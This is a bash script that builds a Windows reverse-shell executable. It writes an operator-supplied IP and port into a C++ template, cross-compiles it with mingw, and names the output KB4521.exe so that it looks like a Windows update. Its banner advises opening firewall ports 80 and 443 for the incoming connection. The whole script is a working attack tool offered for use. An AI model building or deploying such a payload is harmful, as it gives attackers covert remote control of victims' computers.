 #!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+----------------------------------------------------+"
echo -e "|  Adversarial Informatics Weaponized C++ Rev Shell  |"
echo -e "|               cygienesolutions.com                 |"
echo -e "|        [Usage]: ./prometheus.sh <IP> <PORT>        |"
echo -e "+----------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    echo "[*] Prometheus will generate a brand new PE with a hardcoded socket address."
    echo "[!] Don't forget to punch a hole in your FW (80,443) and PRTFWD to the local machine."
    echo -e "${GREEN}"
    echo -e "[Usage]: ./prometheus.sh <IP> <PORT>"
    echo -e "${NC}"
    echo ""
    exit 1; fi

IP=$1
PORT=$2

echo -e "${GREEN}"
echo -e "Building Custom Reverse Shell Executable..."
echo -e "${NC}"


cp rev_shell.cpp_rsc rev_shell.cpp
echo "        char host[] = \"$IP\";" >> rev_shell.cpp
echo "        int port = $PORT;" >> rev_shell.cpp
echo "        RunShell(host, port);" >> rev_shell.cpp
echo "    }" >> rev_shell.cpp
echo "    return 0;" >> rev_shell.cpp
echo "}" >> rev_shell.cpp

echo -e "${GREEN}"
echo -e "Souce code complete..."
echo -e "Compiling..."
echo -e "${NC}"

i686-w64-mingw32-g++ rev_shell.cpp -o KB4521.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc 

echo -e "${GREEN}"
echo -e "Cleaning up..."
echo -e "${NC}"

echo -e "${GREEN}"
echo -e "Done. "
echo -e "Support The Free Information Movement"
echo -e "${NC}"

rm rev_shell.cpp
ls -lrt KB*
file KB4521.exe


